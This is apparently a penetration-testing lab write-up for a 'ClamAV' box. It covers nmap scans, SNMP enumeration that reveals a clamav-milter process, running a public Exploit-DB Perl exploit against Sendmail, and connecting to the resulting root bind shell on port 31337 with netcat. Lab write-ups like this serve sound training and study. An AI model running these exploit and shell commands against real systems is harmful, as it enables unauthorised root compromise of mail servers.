#box #onesixtyone #snmpwalk #perl #RCE 
ClamAV is an easy box. Once the vuln is found the process is quite quick.

## Nmap

The nmap scan is quite messy, but highlights the peculiarity of a SMTP Server. This machine feels to be a machine used as a mail server

```bash
# Nmap 7.95 scan initiated Fri May 16 15:47:10 2025 as: /usr/lib/nmap/nmap -sC -sV --min-rate=10000 -o nmap_sCsV 192.168.183.42
Nmap scan report for 192.168.183.42
Host is up (0.031s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.241], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-16T15:47:20-04:00
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5h59m56s, deviation: 2h49m42s, median: 3h59m56s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 16 15:47:24 2025 -- 1 IP address (1 host up) scanned in 14.25 seconds
```

If we look closely, port 25 is using `Sendmail 8.13.4`, this will be useful to know for later.
At the same time, port 199 somehow recalls the existence of a SNMP service, thus we consider to nmap also UDP ports.

>By looking at the walkthrough from OSCP, they clearly tell that UDP scans can be sometimes unreliable. The scan here is performed but it's important to take in consideration a % of unreliability of this process

```bash
# Nmap 7.95 scan initiated Fri May 16 15:47:00 2025 as: /usr/lib/nmap/nmap -sU --min-rate=10000 -o nmap_sU 192.168.183.42
Nmap scan report for 192.168.183.42
Host is up (0.069s latency).
Not shown: 992 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
137/udp   open   netbios-ns
161/udp   open   snmp
434/udp   closed mobileip-agent
1524/udp  closed ingreslock
1646/udp  closed radacct
16816/udp closed unknown
41524/udp closed unknown
49181/udp closed unknown

# Nmap done at Fri May 16 15:47:01 2025 -- 1 IP address (1 host up) scanned in 0.82 seconds
```

Gotcha, we have SNMP running on 161 (or onesixtyone).

## SNMP

We first run `onesixtyone` with a snmp list to discover which community strings exists:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.183.42
```

Discovering:

```bash
Scanning 1 hosts, 3219 communities
192.168.183.42 [public] Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
192.168.183.42 [public] Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
```

We then run `snmpwalk` over `public` community string to extract some key information from the public community string

```bash
snmpwalk -v2c -c public 192.168.183.42
```

By doing so, we discover the existence of a `root` user. 
However, within this specific machine we discover an useful tool we didn't know earlier. It feels to act like a renderer of the information grasped from the `snmpwalk` scan but translating them in human readable info by scanning all the tree of the snmp community string.
The tool is called `snmp-check` and by using it we extract some key information that will permit us to gain a foothold

```bash
snmp-check -p 161 -c public 192.168.183.42
```

From this scan we got tons of information, one stands out from the rest, a Process called `clamav-milter`.
```bash
  3779                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
```

## Foothold

By looking online at `clamav-milter vulnerabilities` we discover the presence of the following one hinting at a RCE over [Sendmail with clamav-milter < 0.91.2](https://www.exploit-db.com/exploits/4761)
We decide to download the script and, since it's a perl script run it with the perl command and passing it the IP of the target

```perl 
perl 4761.pl 192.168.183.42
```

This, by looking at the perl code, seems to open a port, the port 31337 on the target. In fact, if we try a scan with nmap now that we ran the script on this port we'll discover it's now open with a service called `Elite` on it (hinting at the author of the script).

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 09:18 UTC
Nmap scan report for 192.168.183.42 
Host is up (0.030s latency).

PORT      STATE  SERVICE
31337/tcp open   Elite

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

At this point, we can connect within `netcat` with a bind shell to the target since we've opened a port onto it.

```bash
nc -nv 192.168.183.42 31337
```

Gaining a foothold and, more precisely,  `root` since the service was running as root of the machine.